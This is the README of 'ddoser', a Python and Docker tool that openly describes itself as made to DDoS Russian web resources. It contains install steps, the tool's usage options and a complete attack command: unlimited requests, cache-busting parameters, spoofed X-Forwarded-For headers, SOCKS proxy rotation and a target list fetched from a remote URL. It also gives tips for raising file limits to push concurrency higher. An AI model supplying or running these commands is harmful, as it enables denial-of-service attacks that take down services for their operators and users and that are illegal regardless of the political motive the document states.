# The you seddoser
Small application for ddos attack, was developed special for kill russian's resources :)  
## Docker run (easy way)
Install docker https://docs.docker.com/engine/install/
```shell
# with default urls and proxies
docker run --ulimit nofile=100000:100000 -it imsamurai/ddoser
# with custom params
docker run --ulimit nofile=100000:100000 -it imsamurai/ddoser --target-urls-file sime.txt ... (check usage section)
# help
docker run --ulimit nofile=100000:100000 -it imsamurai/ddoser --help
```
Each run will update ddoser inside.
## Install
### Linux
```shell
sudo apt install python3
sudo apt install python3-pip
git clone https://github.com/taransergey/ddoser.git
cd ddoser/
pip install -r requirements.txt
```
### MacOs
Download and install python3.7-3.9 form here https://www.python.org/downloads/macos/ if you don't have it
or install by brew
```shell
brew install python@3.9
brew link python@3.9
```
### Common for any system
```shell
git clone https://github.com/taransergey/ddoser.git
cd ddoser/
pip install -r requirements.txt
```
## Run
```shell
Usage: ddoser.py [OPTIONS]

  Run ddoser

Options:
  --target-url TEXT         ddos target url
  --target-urls-file TEXT   path or url to file contains urls to ddos
  --proxy-url TEXT          url to proxy resourse
  --proxy-file TEXT         path to file with proxy list
  --concurrency INTEGER     concurrency level
  --count INTEGER           requests count (0 for infinite)
  --timeout INTEGER         requests timeout
  --verbose                 Show verbose log
  --with-random-get-param   add random get argument to prevent cache usage
  --user-agent TEXT         custom user agent
  --log-to-stdout           log to console
  --random-xff-ip           set random ip address value for X-Forwarder-For header
  --restart-period INTEGER  period in seconds to restart application (reload proxies ans targets)
  --help                    Show this message and exit.
```
proxy-file or proxy-url should contain proxy list in format like:
```text
ip1:port1#sock5
ip2:port2#sock4
...
ipN:portN#sock4
```
### Example cmd
```shell
python3 ./ddoser.py --concurrency 100 --timeout 60 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --target-urls-file https://raw.githubusercontent.com/maxindahouze/reactor/main/targets1.txt
```
## Notes
**ddoser** supports only sock proxy, also can start it directly without proxy

If you see an error `too many open files` then you can decrease concurrency/targets count but first of all
try to increase the limits:
### Linux/MacOS:
```shell
ulimit -n 100000
```
### WSL:
```shell
mylimit=100000:
sudo prlimit --nofile=$mylimit --pid $$; ulimit -n $mylimit
```
